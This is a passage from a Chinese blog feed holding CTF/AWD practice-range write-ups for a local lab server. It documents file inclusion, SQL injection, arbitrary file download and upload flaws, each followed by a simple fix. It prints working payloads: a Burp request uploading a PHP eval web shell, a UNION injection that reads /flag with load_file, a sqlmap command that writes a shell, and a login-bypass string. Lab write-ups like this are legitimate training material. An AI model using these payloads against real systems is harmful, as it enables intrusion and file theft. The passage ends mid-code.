punctuation">&#123;</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"验证码不正确！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#check_login($user,$password);</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"密码或用户名不能为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'out'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">login_out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="二-文件包含漏洞"><a href="#二-文件包含漏洞" class="headerlink" title="二.文件包含漏洞"></a>二.文件包含漏洞</h2><p>使用Seay源代码审计系统扫描，发现一堆漏洞，但是自己试了一下就这个可以用</p><p><img src="/images/wordimage/2022/0319/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png"></p><p>利用路径是<code>/admin/admin.php</code>，payload是<code>/admin/admin.php?file=/flag</code></p><p>如下图直接出现flag了</p><p><img src="/images/wordimage/2022/0319/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABflag.png"></p><hr><h3 id="1-修复文件包含漏洞"><a href="#1-修复文件包含漏洞" class="headerlink" title="1.修复文件包含漏洞"></a>1.修复文件包含漏洞</h3><p>找到<code>/admin/admin.php</code>直接注释掉如下代码即可</p><p><img src="/images/wordimage/2022/0319/%E4%BF%AE%E5%A4%8D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png"></p><hr><h2 id="三-文件上传漏洞"><a href="#三-文件上传漏洞" class="headerlink" title="三.文件上传漏洞"></a>三.文件上传漏洞</h2><p>如下图在后台的基本设置可以上传图片，经过测试直接上传图片马即可。</p><p><img src="/images/wordimage/2022/0319/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%9C%B0%E7%82%B9.png"></p><p>burpsuit数据包如下👇</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /admin/admin_pic_upload.php?type<span class="token operator">=</span>radio<span class="token operator">&amp;</span><span class="token assign-left variable">get</span><span class="token operator">=</span>thumb HTTP/1.1Host: <span class="token number">192.168</span>.1.25:8801User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:98.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/98.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>---------------------------327985862040877867422042000643Content-Length: <span class="token number">3412</span>Origin: http://192.168.1.25:8801Connection: closeReferer: http://192.168.1.25:8801/admin/admin_pic_upload.php?type<span class="token operator">=</span>radio<span class="token operator">&amp;</span><span class="token assign-left variable">get</span><span class="token operator">=</span>thumbCookie: <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>j227fvjq0fp4mcb8731r4bj6t7Upgrade-Insecure-Requests: <span class="token number">1</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"pic_cate"</span><span class="token number">1</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"thumb"</span><span class="token number">1</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"is_thumb"</span><span class="token number">1</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"thumb_width"</span><span class="token number">300</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"thumb_height"</span><span class="token number">200</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"is_alt"</span><span class="token number">0</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"num"</span><span class="token number">3</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"up[]"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"shell.php"</span>Content-Type: image/png<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"pic_alt[]"</span>-----------------------------327985862040877867422042000643Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"uppic"</span>-----------------------------327985862040877867422042000643--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图，可以直接使用蚁剑连接。</p><p><img src="/images/wordimage/2022/0319/%E8%9A%81%E5%89%91OK.png"></p><hr><h3 id="1-修复文件上传漏洞"><a href="#1-修复文件上传漏洞" class="headerlink" title="1.修复文件上传漏洞"></a>1.修复文件上传漏洞</h3><p>burp抓包发现上传文件的php文件是<code>/admin/admin_pic_upload.php</code>，找到源代码，最简单的办法，就是不让上传文件，没错暴力简单，找到检测文件的那些代码，如下图修改即可。</p><p><img src="/images/wordimage/2022/0319/%E7%A6%81%E6%AD%A2%E4%B8%8A%E4%BC%A0.png"></p><hr><h2 id="四-其他文件上传漏洞"><a href="#四-其他文件上传漏洞" class="headerlink" title="四.其他文件上传漏洞"></a>四.其他文件上传漏洞</h2><p>代码审计的时候发现了<code>/admin/upload.php</code>文件，猜测是上传文件的，访问一看，如下图👇，发现就是文件上传，而且这里写的非常清楚是文件头过滤，那么修复方法和上面的一样即可。只要上传那么就禁止上传，虽然无脑，但是非常有效。</p><p><img src="/images/wordimage/2022/0319/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-AWD-Yunnan_1</title>
      <link href="/2022/03f186695c.html"/>
      <url>/2022/03f186695c.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>需要提前安装好AWD👉<a href="https://blog.takagisan.top/2022/03185304fd.html">个人AWD的安装</a>。</p><hr><h2 id="一-搜索框SQL注入"><a href="#一-搜索框SQL注入" class="headerlink" title="一.搜索框SQL注入"></a>一.搜索框SQL注入</h2><p>通关搜索框，发现有注入逻辑，下图👇</p><p><img src="/images/wordimage/2022/0316/SQL%E6%90%9C%E7%B4%A2%E6%A1%86.png"></p><p>根据逻辑可以写出payload如下，在搜索框输入即可获得flag</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aa%' union select 1,load_file('/flag'),3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-SQLMAP注入写入文件"><a href="#1-SQLMAP注入写入文件" class="headerlink" title="1.SQLMAP注入写入文件"></a>1.SQLMAP注入写入文件</h3><p>这个方法是偶尔看见的突然感觉有用，在此记录一下，SQLMAP的–file-write和–file-dest可以直接写入一句话木马，下面<code>shell.php</code>是放在sqlmap下面的一句话木马文件，会放在/var/www/html/下的shell.php里面去。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">python sqlmap.py -r 1.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接访问用蚁剑连接即可</p><p>如何防护</p><p>目录下面的<code>sqlgunsearch.php</code>，源码如下,最简单的修复方式就是把echo输出逻辑的那个行删掉</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GUY'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'common.inc.php'</span><span class="token punctuation">;</span><span class="token keyword">global</span> <span class="token variable">$_system</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_key</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("非法访问!");location.href="index.php";&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token variable">$_page</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_page</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_page</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$_page</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$_page</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_pagenums</span><span class="token operator">=</span><span class="token variable">$_system</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pagenums'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_pageopen</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$_pagenums</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"select id from news where title like '%<span class="token interpolation"><span class="token variable">$_key</span></span>%'"</span><span class="token punctuation">;</span><span class="token variable">$_result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select id from news where title like '%<span class="token interpolation"><span class="token variable">$_key</span></span>%'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_nums</span><span class="token operator">=</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$_result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_pages</span><span class="token operator">=</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$_nums</span><span class="token operator">/</span><span class="token variable">$_pagenums</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_results</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select id,title,date from news  where title like '%<span class="token interpolation"><span class="token variable">$_key</span></span>%' order by date DESC limit <span class="token interpolation"><span class="token variable">$_pageopen</span></span>,<span class="token interpolation"><span class="token variable">$_pagenums</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="二-后台SQL注入"><a href="#二-后台SQL注入" class="headerlink" title="二.后台SQL注入"></a>二.后台SQL注入</h2><p>代码审计的时候在发现了后台路径</p><p><img src="/images/wordimage/2022/0316/%E5%90%8E%E5%8F%B0%E8%B7%AF%E5%BE%84.png"></p><p>注入数据包如下👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /sqlgunadmin/login.php?action=login HTTP/1.1Host: 192.168.1.25:8801User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 27Origin: http://192.168.1.25:8801Connection: closeReferer: http://192.168.1.25:8801/sqlgunadmin/login.phpCookie: PHPSESSID=a1a8ana5oci4uib331h2vo5mn6Upgrade-Insecure-Requests: 1admin=1&amp;password=1&amp;yzm=55b5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SQLMAP语句</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">python sqlmap.py -r 1.txt --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>源码如下,根据SQL语句PHP万能密码应该是这样的<code>admin&#125;’ or 1=1#</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_result</span><span class="token operator">=</span>@<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from admin where admin='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_html</span><span class="token punctuation">[</span>admin<span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>' and password='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_html</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'登录错误'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="三-任意文件下载"><a href="#三-任意文件下载" class="headerlink" title="三.任意文件下载"></a>三.任意文件下载</h2><p>登录进去后台，账户密码都是admin，找到如下图位置👇，反正就是怎么点他都不下载。</p><p><img src="/images/wordimage/2022/0316/%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6.png"></p><p>然后审计后台文件，发现一个叫做<code>downlog.php</code>的文件，就和他名字一下用来下载日志的，联想和上图对应，下面是源代码👇，第一个参数必须要为down然后第二个参数，是要传输路径，然后fopen打开读取，由此，payload应该是<code>http://192.168.1.25:8801/sqlgunadmin/downlog.php?downlog=down&amp;filepath=/flag</code>,可以下载flag文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"downlog"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"down"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filepath"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$file_path</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filepath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token variable">$file_size</span><span class="token operator">=</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//下载文件需要用到的头  </span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Accept-Ranges: bytes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Accept-Length:"</span><span class="token operator">.</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename=log.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token variable">$buffer</span><span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">;</span>               <span class="token variable">$file_count</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>               <span class="token comment">//向浏览器返回数据   </span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file_count</span><span class="token operator">&lt;</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   <span class="token variable">$file_con</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token variable">$file_count</span><span class="token operator">+=</span><span class="token variable">$buffer</span><span class="token punctuation">;</span>                   <span class="token keyword">echo</span> <span class="token variable">$file_con</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>              <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>怎么防护，防护我感觉也挺简单的，加一个if语句就可以了，判断是否为正确的路径即可，如果不是那么就是不行，修改后代码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"downlog"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"down"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filepath"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$file_path</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filepath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token operator">===</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token variable">$file_size</span><span class="token operator">=</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">//下载文件需要用到的头  </span>                <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Accept-Ranges: bytes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Accept-Length:"</span><span class="token operator">.</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename=log.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token variable">$buffer</span><span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">;</span>                   <span class="token variable">$file_count</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                   <span class="token comment">//向浏览器返回数据   </span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file_count</span><span class="token operator">&lt;</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                       <span class="token variable">$file_con</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token variable">$file_count</span><span class="token operator">+=</span><span class="token variable">$buffer</span><span class="token punctuation">;</span>                       <span class="token keyword">echo</span> <span class="token variable">$file_con</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span>                  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"小臂崽子你不能看flag哈哈哈哈"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="四-文件上传漏洞"><a href="#四-文件上传漏洞" class="headerlink" title="四.文件上传漏洞"></a>四.文件上传漏洞</h2><p>在后台的新闻发布管理里面有上传文件的操作，如下图👇。</p><p><img src="/images/wordimage/2022/0316/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.png"></p><p>发现是非常简单的js过滤啊，直接BP抓包改包就过了，BP抓包发现图片的路径是在  <code>/sqlgunadmin/kindedit/attached/20220316/20220316135333_51121.php</code>里面啊，然后直接蚁剑连接即可</p><p><img src="/images/wordimage/2022/0316/%E8%9A%81%E5%89%91OK.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-AWD-Yunnan_simple防守和攻击</title>
      <link href="/2022/03a4dd118e.html"/>
      <url>/2022/03a4dd118e.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇是以👉<a href="https://blog.takagisan.top/2022/03185304fd.html">个人AWD的搭建</a>为靶场的WP，</p><hr><h2 id="一-开始准备工作"><a href="#一-开始准备工作" class="headerlink" title="一.开始准备工作"></a>一.开始准备工作</h2><p>口令</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">team1:ctf:02bc53734d16dca2a72a5ebaa11ec09c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span>ctf@873f0a4628bd:/$ <span class="token function">passwd</span>Changing password <span class="token keyword">for</span> ctf.<span class="token punctuation">(</span>current<span class="token punctuation">)</span> UNIX password: Enter new UNIX password: Retype new UNIX password: passwd: password updated successfullyctf@873f0a4628bd:/$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>打包源码和下载</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -zcvf /html.tar.gz /var/www/html/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用WINSCP来下载</p><hr><h2 id="二-代码审计和分析"><a href="#二-代码审计和分析" class="headerlink" title="二.代码审计和分析"></a>二.代码审计和分析</h2><p>使用Seay源代码审计系统来审计源代码</p><p><img src="/images/wordimage/2022/0316/Seay.png"></p><p>那么就按照上面显示的来操作。</p><hr><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a>1.文件包含漏洞</h3><p>漏洞位置<code>/about.php</code>，源码👇</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token 